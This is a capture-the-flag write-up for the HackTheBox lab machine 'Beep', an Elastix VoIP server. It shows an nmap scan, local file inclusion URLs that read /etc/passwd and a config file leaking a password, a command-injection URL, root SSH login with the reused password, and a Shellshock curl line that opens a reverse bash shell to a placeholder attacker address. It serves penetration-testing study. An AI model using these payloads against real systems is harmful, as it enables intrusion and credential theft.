# HackTheBox — Beep

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Web Exploitation / LFI / Default Credentials  
**Status:** Retired  

---

## Summary

Beep runs a heavily-ported Linux server with Elastix (VoIP/PBX platform). The box has multiple valid attack paths including LFI to read credentials, default credential exploitation, and a Shellshock vector. This writeup covers the LFI + credential reuse path to root.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 -oA nmap/beep 10.10.10.7
```

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3
25/tcp    open  smtp       Postfix smtpd
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3       Cyrus pop3d
143/tcp   open  imap       Cyrus imapd
443/tcp   open  ssl/http   Apache httpd 2.2.3
993/tcp   open  ssl/imap
995/tcp   open  ssl/pop3
3306/tcp  open  mysql      MySQL 5.0.77
4445/tcp  open  upnotifyp
10000/tcp open  http       MiniServ 1.570 (Webmin)
```

### Web Browsing

Visiting `https://10.10.10.7` (accepting the SSL cert) shows an **Elastix** login page.

---

## Exploitation Path 1: LFI via Elastix

### CVE-2012-4869 — Elastix LFI

The `graph.php` parameter in Elastix is vulnerable to Local File Inclusion:

```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action
```

Or the classic path:

```
https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=;ls -la
```

More reliable LFI vector:

```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&module=Accounts&action
```

Reading `/etc/amportal.conf` via the LFI leaks credentials:

```
AMPDBPASSWORD=jEhdIekWmdjE
...
admin:jEhdIekWmdjE
```

### SSH with Leaked Credentials

```bash
ssh root@10.10.10.7
# Password: jEhdIekWmdjE
```

**Logs in as root directly.**

---

## Exploitation Path 2: Webmin Default Credentials

MiniServ (Webmin) is running on port 10000.

Try: `root:jEhdIekWmdjE` (reusing LFI creds) or check for CVE-2006-2725 / default creds.

```bash
https://10.10.10.7:10000
```

Webmin provides a built-in "command shell" feature once authenticated as root.

---

## Exploitation Path 3: Shellshock

```bash
# Test for Shellshock on CGI endpoints
curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.14.X/4444 0>&1" \
  https://10.10.10.7/cgi-bin/test.cgi -k
```

---

## Flags

```bash
cat /home/fanis/user.txt
cat /root/root.txt
```

---

## Key Takeaways

- **LFI to config file disclosure** is extremely powerful — config files often contain plaintext credentials
- **Credential reuse** across services is common on old/misconfigured servers
- Boxes with many open ports have multiple attack paths — enumerate all of them
- `amportal.conf` and similar VoIP config files are goldmines during LFI exploitation
- Always try SSH as root with leaked credentials on older Linux systems (root SSH may be enabled)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Full port scan |
| Browser/curl | Manual LFI exploitation |
| ssh | Credential-based access |
